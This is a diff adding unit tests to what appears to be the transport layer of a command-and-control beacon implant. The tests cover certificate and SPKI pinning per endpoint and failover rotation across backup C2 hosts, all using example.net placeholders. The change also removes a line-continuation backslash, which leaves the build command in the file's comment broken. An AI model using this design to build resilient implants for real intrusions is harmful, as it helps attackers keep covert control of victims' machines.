@@ -9,7 +9,7 @@
 //  dials the wrong host.
 //
 //  Build (Linux/WSL):
-//      g++ -std=c++20 -Iphantom/payloads/beacon/src \
+//      g++ -std=c++20 -Iphantom/payloads/beacon/src
 //          phantom/payloads/beacon/src/test_transport.cpp -o /tmp/tt -lssl -lcrypto
 //      /tmp/tt
 //
@@ -131,6 +131,61 @@ int main() {
             check(cfg.on_failure() == false, "single-endpoint ladder never rotates");
         }
         check_eq(cfg.endpoint(), "only.example", "single endpoint unchanged");
+    }
+
+    // ── split_pins_keep_empty ────────────────────────────────────────
+    {
+        auto parts = net::split_pins_keep_empty("aa,,cc");
+        check(parts.size() == 3, "pin split keeps empty fields");
+        check_eq(parts[0], "aa", "pin 0");
+        check_eq(parts[1], "", "pin 1 is empty");
+        check_eq(parts[2], "cc", "pin 2");
+        auto none = net::split_pins_keep_empty("");
+        check(none.size() == 1 && none[0].empty(), "empty pin list = one empty");
+    }
+
+    // ── per-endpoint pins ────────────────────────────────────────────────
+    {
+        net::C2Config cfg;
+        std::string p1(64, 'a'), p2(64, 'b'), p3(64, 'c');
+        cfg.seed_ladder("front.example.net",
+                        "backup1.example.net,backup2.example.net",
+                        p1 + "," + p2 + "," + p3);
+        check_eq(cfg.active_pin(), p1, "primary uses its own pin");
+        cfg.prefer_endpoint("backup2.example.net");
+        check_eq(cfg.active_pin(), p3,
+                 "pin follows the rung through a reorder (keyed by host)");
+        check(cfg.on_failure() == false && cfg.on_failure() == false &&
+              cfg.on_failure() == true, "3rd failure rotates");
+        check_eq(cfg.endpoint(), "front.example.net", "rotation wraps to primary");
+        check_eq(cfg.active_pin(), p1, "primary pin again after the wrap");
+    }
+
+    // ── an empty field inherits the fallback pin ─────────────────────────
+    {
+        net::C2Config cfg;
+        std::string p1(64, 'a');
+        cfg.seed_ladder("front.example.net", "backup.example.net", p1 + ",");
+        check_eq(cfg.active_pin(), p1, "primary has its own pin");
+        check(cfg.host_pins.count("backup.example.net") == 0,
+              "an empty field leaves the rung on the fallback pin");
+        cfg.failover_after = 1;
+        cfg.on_failure();
+        check_eq(cfg.active_pin(), cfg.compiled_pin(),
+                 "the unpinned rung resolves to the compiled pin");
+    }
+
+    // ── SPKI pins travel with the same rungs (macOS/libcurl) ─────────────
+    {
+        net::C2Config cfg;
+        std::string s1 = "sha256//" + std::string(43, 'A') + "=";
+        std::string s2 = "sha256//" + std::string(43, 'B') + "=";
+        cfg.seed_ladder("front.example.net", "backup.example.net", "",
+                        s1 + "," + s2);
+        check_eq(cfg.active_pubkey_pin(), s1, "primary SPKI pin");
+        cfg.failover_after = 1;
+        cfg.on_failure();
+        check_eq(cfg.active_pubkey_pin(), s2, "fallback SPKI pin");
     }
 
     // ── proxy parsing ────────────────────────────────────────────────────
